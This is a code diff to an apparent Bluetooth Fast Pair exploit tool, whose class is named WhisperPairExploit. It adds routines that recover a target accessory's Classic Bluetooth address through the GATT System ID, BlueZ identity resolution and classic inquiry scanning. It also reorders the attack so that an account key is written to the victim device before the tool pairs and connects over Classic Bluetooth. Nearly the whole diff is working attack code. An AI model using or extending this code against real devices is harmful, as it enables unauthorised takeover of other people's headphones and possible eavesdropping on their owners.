@@ -54,6 +54,9 @@ CHAR_KEY_PAIRING = "fe2c1234-8366-4814-8eb0-01de32100bea"
 CHAR_PASSKEY = "fe2c1235-8366-4814-8eb0-01de32100bea"
 CHAR_ACCOUNT_KEY = "fe2c1236-8366-4814-8eb0-01de32100bea"
 
+# GATT Device Information Service
+CHAR_SYSTEM_ID = "00002a23-0000-1000-8000-00805f9b34fb"
+
 
 class MessageType(IntEnum):
     KEY_BASED_PAIRING_REQUEST = 0x00
@@ -193,6 +196,182 @@ def is_valid_mac(address: str) -> bool:
         return False
 
 
+
+def parse_system_id(data: bytes) -> Optional[str]:
+    """Extract BD_ADDR from a GATT System ID (0x2A23) characteristic value.
+
+    System ID is an 8-byte EUI-64 derived from the device's BD_ADDR:
+      BD_ADDR  AA:BB:CC:DD:EE:FF
+      EUI-64   AA:BB:CC:FF:FE:DD:EE:FF  (0xFFFE inserted in the middle)
+
+    The GATT characteristic stores this LSO-first:
+      Bytes 0-4: Manufacturer ID (LSO first) → FF:EE:DD:FE:FF
+      Bytes 5-7: OUI (LSO first)             → CC:BB:AA
+
+    Returns the BD_ADDR as a colon-separated MAC string, or None.
+    """
+    if len(data) != 8:
+        return None
+
+    # Check for the 0xFFFE marker that indicates EUI-48 → EUI-64 conversion
+    if data[3] != 0xFE or data[4] != 0xFF:
+        return None
+
+    # Reconstruct BD_ADDR: OUI (bytes 5-7 reversed) + Manuf ID (bytes 0-2 reversed)
+    oui = data[7], data[6], data[5]
+    manuf = data[2], data[1], data[0]
+    bd_addr = ':'.join(f'{b:02X}' for b in (*oui, *manuf))
+
+    if not is_valid_mac(bd_addr):
+        return None
+    return bd_addr
+
+
+async def resolve_identity_address(ble_address: str, timeout: float = 15.0,
+                                    status_cb: Callable = None) -> Optional[str]:
+    """Pair via BLE SMP and read the resolved identity address from BlueZ.
+
+    After BLE pairing, BlueZ resolves the random advertising address to the
+    device's identity address (which is the BR/EDR public address for
+    dual-mode devices).
+
+    Args:
+        ble_address: The BLE random address to pair with
+        timeout: Maximum time to wait for pairing
+        status_cb: Optional callback(msg) for progress updates
+
+    Returns:
+        The resolved public/BR/EDR address, or None.
+    """
+    from dbus_fast.aio import MessageBus
+    from dbus_fast import BusType, Variant
+
+    BLUEZ_SERVICE = "org.bluez"
+    DEVICE_IFACE = "org.bluez.Device1"
+    PROPERTIES_IFACE = "org.freedesktop.DBus.Properties"
+    OBJECT_MANAGER_IFACE = "org.freedesktop.DBus.ObjectManager"
+
+    def log(msg):
+        if status_cb:
+            status_cb(msg)
+        else:
+            print(f"[identity] {msg}")
+
+    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
+    try:
+        # Find the device object in BlueZ
+        introspection = await bus.introspect(BLUEZ_SERVICE, "/")
+        obj_manager = bus.get_proxy_object(BLUEZ_SERVICE, "/", introspection)
+        manager = obj_manager.get_interface(OBJECT_MANAGER_IFACE)
+        objects = await manager.call_get_managed_objects()
+
+        addr_normalized = ble_address.upper().replace(":", "_")
+        device_path = None
+        for path in objects:
+            if addr_normalized in path:
+                device_path = path
+                break
+
+        if not device_path:
+            log(f"Device {ble_address} not found in BlueZ — trying scan first")
+            # Quick discovery to make BlueZ aware of the device
+            adapter_path = None
+            for path, ifaces in objects.items():
+                if "org.bluez.Adapter1" in ifaces:
+                    adapter_path = path
+                    break
+            if adapter_path:
+                adapter_intro = await bus.introspect(BLUEZ_SERVICE, adapter_path)
+                adapter_obj = bus.get_proxy_object(BLUEZ_SERVICE, adapter_path, adapter_intro)
+                adapter = adapter_obj.get_interface("org.bluez.Adapter1")
+                try:
+                    await adapter.call_start_discovery()
+                    await asyncio.sleep(5)
+                    await adapter.call_stop_discovery()
+                except Exception:
+                    pass
+
+            # Re-scan objects
+            objects = await manager.call_get_managed_objects()
+            for path in objects:
+                if addr_normalized in path:
+                    device_path = path
+                    break
+
+        if not device_path:
+            log(f"Device {ble_address} still not found in BlueZ")
+            return None
+
+        # Get device interface
+        dev_intro = await bus.introspect(BLUEZ_SERVICE, device_path)
+        dev_obj = bus.get_proxy_object(BLUEZ_SERVICE, device_path, dev_intro)
+        device = dev_obj.get_interface(DEVICE_IFACE)
+        props = dev_obj.get_interface(PROPERTIES_IFACE)
+
+        # Check if already paired and address already resolved
+        addr_type_var = await props.call_get(DEVICE_IFACE, "AddressType")
+        addr_var = await props.call_get(DEVICE_IFACE, "Address")
+        if addr_type_var.value == "public" and addr_var.value.upper() != ble_address.upper():
+            log(f"Already resolved: {addr_var.value} (public)")
+            return addr_var.value.upper()
+
+        # Pair to trigger SMP and identity address exchange
+        log("BLE SMP pairing to resolve identity address...")
+        try:
+            await asyncio.wait_for(device.call_pair(), timeout=timeout)
+        except asyncio.TimeoutError:
+            log("Pairing timed out")
+            return None
+        except Exception as e:
+            if "AlreadyExists" in str(e):
+                log("Already paired")
+            else:
+                log(f"Pairing failed: {e}")
+                return None
+
+        # After pairing, BlueZ may have moved the device to a new path
+        # under its identity address. Re-scan managed objects.
+        await asyncio.sleep(1)
+        objects = await manager.call_get_managed_objects()
+
+        # Check all devices for a newly-resolved public address
+        for path, ifaces in objects.items():
+            if DEVICE_IFACE not in ifaces:
+                continue
+            dev_props = ifaces[DEVICE_IFACE]
+
+            addr = dev_props.get("Address")
+            addr_val = addr.value if hasattr(addr, "value") else addr
+            addr_type = dev_props.get("AddressType")
+            type_val = addr_type.value if hasattr(addr_type, "value") else addr_type
+
+            if type_val == "public" and addr_val and addr_val.upper() != ble_address.upper():
+                # Verify this is related to our device (same path root or paired recently)
+                paired = dev_props.get("Paired")
+                paired_val = paired.value if hasattr(paired, "value") else paired
+                if paired_val:
+                    log(f"Identity address resolved: {addr_val}")
+                    return addr_val.upper()
+
+        # Also re-read the original device path (BlueZ may update in-place)
+        try:
+            dev_intro = await bus.introspect(BLUEZ_SERVICE, device_path)
+            dev_obj = bus.get_proxy_object(BLUEZ_SERVICE, device_path, dev_intro)
+            props = dev_obj.get_interface(PROPERTIES_IFACE)
+            addr_type_var = await props.call_get(DEVICE_IFACE, "AddressType")
+            addr_var = await props.call_get(DEVICE_IFACE, "Address")
+            if addr_type_var.value == "public":
+                log(f"Identity address resolved (in-place): {addr_var.value}")
+                return addr_var.value.upper()
+        except Exception:
+            pass
+
+        log("Pairing completed but identity address not resolved")
+        return None
+    finally:
+        bus.disconnect()
+
+
 def extract_address(data: bytes, offset: int) -> str:
     """Extract MAC address from bytes at offset"""
     if offset + 6 > len(data):
@@ -200,17 +379,21 @@ def extract_address(data: bytes, offset: int) -> str:
     return ':'.join(f'{b:02X}' for b in data[offset:offset+6])
 
 
-def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None) -> Optional[str]:
+def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None,
+                       ble_address: Optional[str] = None) -> Optional[str]:
     """
-    Robust response parsing with multiple strategies.
+    Parse a KBP response notification to extract the BR/EDR address.
     Returns BR/EDR address if found, None otherwise.
+
+    Args:
+        data: Raw KBP notification bytes
+        shared_secret: Shared secret for decryption attempts
+        ble_address: The BLE scan address (unused, kept for API compat)
 
     Strategies (in order):
     1. Standard response format (type 0x01, address at offset 1)
     2. Extended response format (type 0x02, address count + addresses)
     3. Decrypt with shared secret, then check standard format
-    4. Decrypt with shared secret, brute-force MAC in decrypted data
-    5. Brute-force MAC pattern scan in raw data
     """
     if len(data) < 7:
         return None
@@ -229,7 +412,7 @@ def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None) -> Op
             if is_valid_mac(addr):
                 return addr
 
-    # Strategy 3 & 4: Decrypt with shared secret
+    # Strategy 3: Decrypt with shared secret, then check standard format
     if shared_secret and len(data) == 16:
         # Try multiple key derivations
         keys_to_try = [shared_secret]
@@ -245,30 +428,152 @@ def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None) -> Op
             try:
                 decrypted = aes_decrypt(key, data)
 
-                # Strategy 3: Standard format in decrypted data
+                # Check for standard response format in decrypted data
                 if decrypted[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
                     addr = extract_address(decrypted, 1)
                     if is_valid_mac(addr):
                         return addr
-
-                # Strategy 4: Brute-force MAC in decrypted data
-                for offset in range(len(decrypted) - 5):
-                    addr = extract_address(decrypted, offset)
-                    if is_valid_mac(addr):
-                        # Verify it doesn't look like random noise
-                        addr_bytes = decrypted[offset:offset+6]
-                        entropy = calculate_entropy(addr_bytes)
-                        if entropy < 2.5:  # Real MACs have lower entropy than random
-                            return addr
             except Exception:
                 continue
 
-    # Strategy 5: Brute force scan for valid MAC pattern in raw data
-    for offset in range(len(data) - 5):
-        addr = extract_address(data, offset)
-        if is_valid_mac(addr):
-            return addr
+    # No brute-force scanning — too many false positives on random data.
+    # If the response doesn't follow the standard format, the address must
+    # be resolved via other means (System ID, SMP identity, inquiry, etc.).
+    return None
 
+
+# ==============================================================================
+# BR/EDR ADDRESS DISCOVERY VIA CLASSIC INQUIRY
+# ==============================================================================
+
+def discover_bredr_address(device_name: str, ble_address: str = None,
+                           timeout: int = 12, status_cb: Callable = None) -> Optional[str]:
+    """Discover the BR/EDR (Classic BT) address of a device by running an
+    inquiry scan and matching on device name and/or OUI prefix.
+
+    Args:
+        device_name: Name learned during BLE connection (e.g. "Pixel Buds Pro")
+        ble_address: BLE address for OUI-prefix tie-breaking
+        timeout: Inquiry duration in seconds
+        status_cb: Optional callback(msg) for progress updates
+
+    Returns:
+        BR/EDR MAC address string, or None if not found.
+    """
+    def log(msg):
+        if status_cb:
+            status_cb(msg)
+        else:
+            print(f"{Fore.BLUE}[inquiry] {msg}{Style.RESET_ALL}")
+
+    if not device_name or device_name == "Unknown":
+        log("No device name available for Classic BT inquiry")
+        return None
+
+    log(f"Starting Classic BT inquiry for '{device_name}' ({timeout}s)...")
+
+    # Use bluetoothctl to scan for BR/EDR devices
+    # First ensure the adapter is powered and classic scan is on
+    try:
+        subprocess.run(["bluetoothctl", "power", "on"],
+                       capture_output=True, text=True, timeout=5)
+    except Exception:
+        pass
+
+    # Run inquiry via hcitool inq (returns addr + class + clock offset)
+    try:
+        inq_result = subprocess.run(
+            ["hcitool", "inq", "--length", str(max(timeout // 1, 1))],
+            capture_output=True, text=True, timeout=timeout + 10
+        )
+        inq_output = inq_result.stdout
+    except subprocess.TimeoutExpired:
+        log("Inquiry timed out")
+        inq_output = ""
+    except FileNotFoundError:
+        log("hcitool not found, falling back to bluetoothctl")
+        inq_output = ""
+
+    # Parse inquiry results: lines like "	AA:BB:CC:DD:EE:FF	clock offset: ...	class: ..."
+    candidates = []
+    for line in inq_output.splitlines():
+        match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line)
+        if match:
+            candidates.append(match.group(1).upper())
+
+    if not candidates:
+        # Fallback: try bluetoothctl scan for a short burst
+        log("No devices from hcitool inq, trying bluetoothctl scan...")
+        try:
+            scan_proc = subprocess.Popen(
+                ["bluetoothctl", "scan", "bredr"],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
+            )
+            end_time = datetime.now().timestamp() + timeout
+            while datetime.now().timestamp() < end_time:
+                line = scan_proc.stdout.readline()
+                if not line:
+                    break
+                match = re.search(r'Device\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(.*)', line)
+                if match:
+                    addr = match.group(1).upper()
+                    name = match.group(2).strip()
+                    if device_name.lower() in name.lower():
+                        scan_proc.terminate()
+                        log(f"Found '{name}' at {addr} via bluetoothctl scan")
+                        return addr
+                    candidates.append(addr)
+            scan_proc.terminate()
+        except Exception as e:
+            log(f"bluetoothctl scan failed: {e}")
+
+    if not candidates:
+        log("No BR/EDR devices found in range")
+        return None
+
+    log(f"Found {len(candidates)} BR/EDR device(s), resolving names...")
+
+    # Resolve names and match
+    ble_oui = ble_address[:8].upper() if ble_address and len(ble_address) >= 8 else None
+    name_matches = []
+    oui_matches = []
+
+    for addr in candidates:
+        try:
+            name_result = subprocess.run(
+                ["hcitool", "name", addr],
+                capture_output=True, text=True, timeout=8
+            )
+            resolved_name = name_result.stdout.strip()
+        except Exception:
+            resolved_name = ""
+
+        log(f"  {addr} -> '{resolved_name}'")
+
+        if resolved_name and device_name.lower() in resolved_name.lower():
+            name_matches.append(addr)
+        elif ble_oui and addr[:8].upper() == ble_oui:
+            oui_matches.append(addr)
+
+    # Prefer name match; tie-break with OUI if multiple
+    if name_matches:
+        if len(name_matches) == 1:
+            log(f"BR/EDR address found by name match: {name_matches[0]}")
+            return name_matches[0]
+        # Multiple name matches — prefer OUI overlap
+        if ble_oui:
+            for addr in name_matches:
+                if addr[:8].upper() == ble_oui:
+                    log(f"BR/EDR address found by name + OUI match: {addr}")
+                    return addr
+        log(f"BR/EDR address found by name match (first of {len(name_matches)}): {name_matches[0]}")
+        return name_matches[0]
+
+    if oui_matches:
+        log(f"BR/EDR address found by OUI match: {oui_matches[0]}")
+        return oui_matches[0]
+
+    log("No BR/EDR address matched by name or OUI")
     return None
 
 
@@ -370,7 +675,7 @@ class WhisperPairExploit:
             self.kbp_response = data
 
             # Try to parse BR/EDR address
-            addr = parse_kbp_response(data, self.shared_secret)
+            addr = parse_kbp_response(data, self.shared_secret, ble_address=self.target_address)
             if addr:
                 self.br_edr_address = addr
                 print(f"{Fore.GREEN}BR/EDR Address: {addr}{Style.RESET_ALL}")
@@ -434,6 +739,19 @@ class WhisperPairExploit:
         except Exception as e:
             print(f"{Fore.YELLOW}[!] Could not read Model ID: {e}{Style.RESET_ALL}")
         return None
+
+    async def read_system_id(self) -> Optional[str]:
+        """Try reading System ID (0x2A23) to extract BR/EDR address."""
+        try:
+            data = await self.client.read_gatt_char(CHAR_SYSTEM_ID)
+            addr = parse_system_id(data)
+            if addr:
+                print(f"{Fore.GREEN}[+] BR/EDR address from System ID: {addr}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}[!] System ID present but not BD_ADDR-derived: {data.hex()}{Style.RESET_ALL}")
+            return addr
+        except Exception:
+            return None  # System ID not available
 
     async def subscribe_notifications(self):
         """Subscribe to Fast Pair notifications"""
@@ -543,6 +861,9 @@ class WhisperPairExploit:
             # Step 2: Read Model ID
             await self.read_model_id()
 
+            # Step 2.5: Try System ID for BR/EDR address (free, no pairing)
+            system_id_address = await self.read_system_id()
+
             # Step 3: Subscribe to notifications
             await self.subscribe_notifications()
             await asyncio.sleep(0.5)
@@ -571,32 +892,79 @@ class WhisperPairExploit:
                 result.message = "All strategies rejected - device appears patched"
                 return result
 
-            # Step 5: Determine BR/EDR address
-            if not self.br_edr_address:
-                # Fallback: use BLE address
-                self.br_edr_address = self.target_address
-                print(f"{Fore.YELLOW}[!] Using BLE address as BR/EDR fallback{Style.RESET_ALL}")
-
-            result.br_edr_address = self.br_edr_address
-
-            # Step 6: Write Account Key
+            # Step 5: Write Account Key WHILE STILL CONNECTED
             await asyncio.sleep(0.5)
             result.account_key_written = await self.write_account_key()
 
-            # Step 7: Disconnect BLE
+            # Get device name for Classic BT inquiry fallback.
+            # Try BLE advertisement name first (from Bleak), then GATT 0x2A00.
+            device_name = None
+            if self.client and self.client.is_connected:
+                # Bleak exposes the advertised name via the underlying device object
+                try:
+                    ble_dev = self.client._device_info  # bleak internals
+                    if hasattr(ble_dev, 'name') and ble_dev.name:
+                        device_name = ble_dev.name
+                except Exception:
+                    pass
+                # Fallback: try GATT Device Name characteristic
+                if not device_name:
+                    try:
+                        for service in self.client.services:
+                            for char in service.characteristics:
+                                if "2a00" in str(char.uuid).lower():
+                                    raw = await self.client.read_gatt_char(char.uuid)
+                                    device_name = raw.decode("utf-8", errors="ignore").strip()
+                                    break
+                            if device_name:
+                                break
+                    except Exception:
+                        pass
+                if device_name:
+                    print(f"{Fore.BLUE}[*] Device name: {device_name}{Style.RESET_ALL}")
+
+            # Step 6: Disconnect BLE
             await self.disconnect()
 
-            # Step 8: Pair via Classic Bluetooth
-            print(f"\n{Fore.CYAN}{'─'*60}")
-            print(f"Classic Bluetooth Pairing")
-            print(f"{'─'*60}{Style.RESET_ALL}")
+            # Step 7: Determine BR/EDR address
+            if not self.br_edr_address:
+                print(f"{Fore.YELLOW}[!] KBP response did not contain BR/EDR address, "
+                      f"trying fallbacks...{Style.RESET_ALL}")
 
-            result.paired = pair_classic_bluetooth(self.br_edr_address)
+                # Fallback A: System ID
+                if system_id_address:
+                    self.br_edr_address = system_id_address
+                    print(f"{Fore.GREEN}[+] Using BR/EDR from System ID: {system_id_address}{Style.RESET_ALL}")
 
-            if result.paired:
-                connect_classic_bluetooth(self.br_edr_address)
+                # Fallback B: Classic BT inquiry (by device name)
+                if not self.br_edr_address and device_name and device_name != "Unknown":
+                    print(f"{Fore.BLUE}[*] Running Classic BT inquiry for '{device_name}'...{Style.RESET_ALL}")
+                    inquiry_addr = discover_bredr_address(
+                        device_name=device_name,
+                        ble_address=self.target_address,
+                    )
+                    if inquiry_addr:
+                        self.br_edr_address = inquiry_addr
+                        print(f"{Fore.GREEN}[+] BR/EDR via inquiry: {inquiry_addr}{Style.RESET_ALL}")
 
-            result.success = result.vulnerable and (result.paired or result.account_key_written)
+                if not self.br_edr_address:
+                    print(f"{Fore.RED}[!] Could not determine BR/EDR address.{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}    Use the phone companion app or provide the address manually.{Style.RESET_ALL}")
+
+            result.br_edr_address = self.br_edr_address
+
+            # Step 8: Pair via Classic Bluetooth (if BR/EDR address known)
+            if self.br_edr_address:
+                print(f"\n{Fore.CYAN}{'─'*60}")
+                print(f"Classic Bluetooth Pairing")
+                print(f"{'─'*60}{Style.RESET_ALL}")
+
+                result.paired = pair_classic_bluetooth(self.br_edr_address)
+
+                if result.paired:
+                    connect_classic_bluetooth(self.br_edr_address)
+
+            result.success = result.vulnerable and result.account_key_written
             result.notifications = self.notifications
 
             if result.success:
